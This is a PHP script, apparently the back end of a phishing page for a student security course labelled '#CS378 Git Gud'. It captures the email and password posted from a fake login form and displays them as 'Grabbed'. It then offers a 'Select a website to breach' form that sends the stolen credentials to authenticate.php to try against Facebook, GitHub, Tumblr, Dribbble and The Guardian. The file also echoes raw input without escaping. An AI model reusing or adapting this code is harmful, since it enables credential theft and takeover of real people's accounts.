<?php 

// Add message
echo "<h1 style='color:red; text-decoration: underline;' align='center'>#CS378 Git Gud</h1>";

// Add syle
echo "<style>
          table {
 	      font-family: arial, sans-serif;
              border-collapse: collapse;
              width: 50%;
          }
          td, th {
              border: 1px solid black;
              text-align: left;
              padding: 8px;
          }  
          tr:nth-child(even) {
              background-color: #dddddd;
          }
       </style>";   

echo "<h3>Grabbed:</h3>"; 

// Grab credentials
$user = $_POST['email'];
$pass = $_POST['pass'];

// Display credentials
echo "<table>
          <tr> 
 	      <th>Username</th>
 	      <th>Password</th>
          </tr>
          <tr>
              <td>" . $user . "</td> 
              <td>" . $pass . "</td>
          </tr>
      </table>";

// Add script to show which are selected
echo "<script>";
echo "function getSelectedValues(select) {
          var result = [];
          var options = select && select.options;
          var opt;
          
          for (var i = 0; i < options.length; i++) { 
              opt = options[i];
              if (opt.selected) { 
                  result.push(opt.text);
              }
          }
          document.getElementById('selectedText').innerHTML = result.join(', '); 
      }
      function submitForm() {
          document.body.style.cursor='progress';
      }";
echo "</script>";

// Attempt to autheticate to several well-known websites - add a selector to do so
echo "<div id='breach'>";
echo "<p>Select a website to breach:</p>";
echo "<form id='selectForm' name='selectForm' method='get' action='authenticate.php' onsubmit='submitForm()'>";
echo "<select id='breachSelector' name='breachSelector[]' multiple onChange='getSelectedValues(this)'>
          <option value='facebook' selected>Facebook</option>
          <option value='dribbble' selected>Dribbble</option>
          <option value='github' selected>Github</option>
          <option value='tumblr' selected>Tumblr</option>
          <option value='theguardian' selected>TheGuardian</option>
      </select>";
echo "<p id='selectedText'>Facebook, Dribbble, Github, Tumblr, TheGuardian</p>";
echo "<input type='submit' name='submit' value='Submit'/>";
echo "<input type='hidden' name='username' value='" . $user . "'/>";
echo "<input type='hidden' name='password' value='" . $pass . "'/>";
echo "</form>";
echo "</div>";
?>
